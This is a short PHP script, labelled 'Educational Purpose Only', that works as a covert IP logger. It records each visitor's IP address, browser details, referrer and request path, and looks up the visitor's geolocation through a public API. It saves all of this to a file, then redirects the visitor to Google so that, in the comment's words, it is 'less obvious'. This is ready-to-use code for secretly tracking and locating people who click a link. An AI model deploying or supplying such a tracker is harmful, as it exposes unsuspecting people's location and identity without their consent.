<?php
// ip_logger.php - Educational Purpose Only

// Function to get client IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Get client information
$ip = getClientIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date("Y-m-d H:i:s");
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';
$request_uri = $_SERVER['REQUEST_URI'];

// Get geolocation data (using free API)
$geo_data = [];
if ($ip && $ip != 'UNKNOWN') {
    $geo_api_url = "http://ip-api.com/json/{$ip}";
    $geo_json = @file_get_contents($geo_api_url);
    $geo_data = json_decode($geo_json, true);
}

// Log the data
$log_data = [
    'date' => $date,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'referrer' => $referrer,
    'request_uri' => $request_uri,
    'geo_data' => $geo_data
];

// Save to file
file_put_contents('ip_logs.json', json_encode($log_data, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);

// Redirect to a benign page (to make it less obvious)
header('Location: https://www.google.com');
exit();
?>